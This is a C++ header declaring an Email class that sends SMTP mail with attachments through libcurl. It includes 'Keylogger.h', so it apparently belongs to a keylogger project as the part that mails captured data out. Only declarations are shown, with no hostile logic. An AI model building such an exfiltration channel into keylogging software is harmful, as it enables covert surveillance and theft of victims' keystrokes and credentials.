#pragma once
#pragma comment(lib,"libcurl.lib") 

#include <vector>
#include <iostream>
#include "curl/curl.h"
#include "Keylogger.h"

using namespace std;

class Email
{
public:
	
	Email();
	

	void setTo(const std::string to);


	void setFrom(const std::string from);


	void setSubject(const std::string subject);


	void setBody(const std::string body);

	
	void setSMTP_username(const std::string username);

	
	void setSMTP_password(const std::string password);

	
	void setSMTP_host(const std::string host);

	
	void addAttachment(const std::string filepath);


	void removeAllAttachments();

	
	void constructEmail();

	
	int send() const;
	
	

private:
	// smtp information
	string	smtp_user;
	string smtp_password;
	string smtp_host;

	// email data
	string to;
	string from;
	string subject;
	string body;

	// vector which stores the email data
	vector<string> email_contents;
	vector<string> attachments;

};